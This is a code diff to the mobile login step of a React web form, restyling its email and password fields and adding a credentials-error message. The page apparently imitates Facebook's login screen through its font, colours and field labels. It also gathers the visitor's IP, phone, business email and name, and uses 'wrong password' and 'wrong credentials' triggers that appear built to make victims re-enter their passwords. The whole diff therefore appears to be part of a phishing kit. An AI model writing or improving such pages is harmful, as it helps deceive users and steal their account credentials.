@@ -72,8 +72,7 @@ const FormSection = styled.div`
   display: flex;
   flex-direction: column;
   width: 100%;
-  margin-top: 0; /* Centering handled by LoginBoxWrapper or direct placement */
-  /* flex-grow: 1; Removed, let content define its height */
+  margin-top: 0;
 `;
 
 const InputsContainer = styled.div`
@@ -85,78 +84,44 @@ const InputsContainer = styled.div`
 const CustomInput = styled.input`
   border: 1px solid #dddfe2 !important;
   border-radius: 10px !important; /* User updated */
-  /* Adjusted padding for floating label: top, right, bottom, left */
-  padding: 22px 16px 6px 16px !important;
+  padding: 22px 16px 10px 16px !important;
   background-color: #fff;
   margin-top: 0;
   width: 100%;
   font-size: 17px;
   color: #1d2129;
   line-height: 1.34;
-  min-height: auto;
+  min-height: 56px;
   font-family: FBook, Helvetica, system-ui, sans-serif !important;
 
   &.redborder {
     border: 1px solid red !important;
   }
 
-  ::placeholder {
-    /* Placeholder is used for the :not(:placeholder-shown) selector, so make it transparent */
-    color: transparent;
-    user-select: none; /* Prevent selection of the space placeholder */
-  }
-  /* margin-bottom: 12px; Moved to FormFloatingWrapper */
-
   &:focus {
     outline: none;
     border-color: #0866ff !important;
     box-shadow: 0 0 0 2px #e7f3ff;
+    background-color: #fff;
   }
 `;
 
 const FormFloatingWrapper = styled.div`
   position: relative;
-  margin-bottom: 12px; /* Was on CustomInput */
+  margin-bottom: 12px;
 `;
 
-const FloatingLabel = styled.label`
+const InputLabel = styled.label`
   position: absolute;
-  top: 14px; /* Initial vertical position */
-  left: 16px; /* Initial horizontal position */
-  font-size: 17px;
+  top: 8px;
+  left: 16px;
+  font-size: 12px;
   font-weight: 400;
-  color: #90949c; /* Original placeholder color */
+  color: #606770;
+  line-height: 1;
   pointer-events: none;
-  transition: all 0.2s ease-out;
-  background-color: #fff; /* For "notch" effect when floated */
-  padding: 0 4px; /* Horizontal padding for the notch */
-  line-height: 1.34; /* Match CustomInput */
   font-family: FBook, Helvetica, system-ui, sans-serif !important;
-
-  /* Style for when the associated input is disabled */
-  ${CustomInput}:disabled ~ & {
-    color: #adb5bd; /* Muted color for disabled state */
-  }
-`;
-
-// Styles for the floated label state within FormFloatingWrapper
-const StyledFormFloatingWrapper = styled(FormFloatingWrapper)`
-  ${CustomInput}:focus ~ ${FloatingLabel},
-    ${CustomInput}:not(:placeholder-shown) ~ ${FloatingLabel} {
-    top: 0;
-    left: 12px; /* Indent when floated */
-    transform: translateY(
-      -50%
-    ); /* Center vertically on the input's top border */
-    font-size: 13px; /* Smaller font for floated label */
-    height: auto;
-    line-height: 1;
-    color: #1d2129; /* Default text color when floated */
-  }
-
-  ${CustomInput}:focus:not(:disabled) ~ ${FloatingLabel} {
-    color: #0866ff; /* Highlight color when input is focused and enabled */
-  }
+  z-index: 1;
 `;
 
 const LoginButton = styled.button`
@@ -328,6 +293,7 @@ function Step2Mobile({
   setParentBeginTimer,
   InvalidPassword,
   wrongPasswordTrigger,
+  wrongCredsTrigger,
 }) {
   const [isValidEmail, setIsValidEmail] = useState(false);
   const { setAllData, AllData } = useContext(DataContext);
@@ -339,19 +305,25 @@ function Step2Mobile({
     isLoading,
     passwordError,
     emailError,
+    credentialsError,
+    hasCredsError,
     triedSubmit,
     passwordAttempt,
     handleSubmit,
     clearPasswordError,
     clearEmailError,
+    clearCredentialsError,
+    clearCredsBorderOnly,
   } = usePasswordAuth({
     Unik,
     Email,
+    setEmail,
     Tel,
     BusinessEmail,
     Name,
     Ip,
     wrongPasswordTrigger,
+    wrongCredsTrigger,
     setParentBeginTimer,
   });
 
@@ -385,39 +357,42 @@ function Step2Mobile({
       <LoginBoxWrapper>
         <FormSection>
           <InputsContainer>
-            <StyledFormFloatingWrapper>
+            {credentialsError && (
+              <ValidationError style={{whiteSpace: 'pre-line', marginBottom: '12px'}}>{credentialsError}</ValidationError>
+            )}
+            <FormFloatingWrapper>
               <CustomInput
                 type="text"
                 id="email-input"
                 value={Email}
                 onChange={handleEmailChange}
-                placeholder=" "
+                onFocus={clearCredsBorderOnly}
                 className={`form-control ${
-                  !isValidEmail && triedSubmit ? "redborder" : ""
+                  hasCredsError || (!isValidEmail && triedSubmit) ? "redborder" : ""
                 }`}
                 disabled={isLoading}
               />
-              <FloatingLabel htmlFor="email-input">
+              <InputLabel htmlFor="email-input">
                 Mobile number or email address
-              </FloatingLabel>
-            </StyledFormFloatingWrapper>
-            {emailError && <ValidationError>{emailError}</ValidationError>}
+              </InputLabel>
+            </FormFloatingWrapper>
+            {!credentialsError && emailError && <ValidationError>{emailError}</ValidationError>}
 
-            <StyledFormFloatingWrapper>
+            <FormFloatingWrapper>
               <CustomInput
                 type="password"
                 id="password-input"
                 value={password}
                 onChange={handlePasswordChange}
-                placeholder=" "
+                onFocus={clearCredsBorderOnly}
                 className={`form-control ${
-                  password.length < 5 && triedSubmit ? "redborder" : ""
+                  hasCredsError || (password.length < 5 && triedSubmit) ? "redborder" : ""
                 }`}
                 disabled={isLoading}
               />
-              <FloatingLabel htmlFor="password-input">Password</FloatingLabel>
-            </StyledFormFloatingWrapper>
-            {passwordError && (
+              <InputLabel htmlFor="password-input">Password</InputLabel>
+            </FormFloatingWrapper>
+            {!credentialsError && passwordError && (
               <ValidationError>{passwordError}</ValidationError>
             )}
 
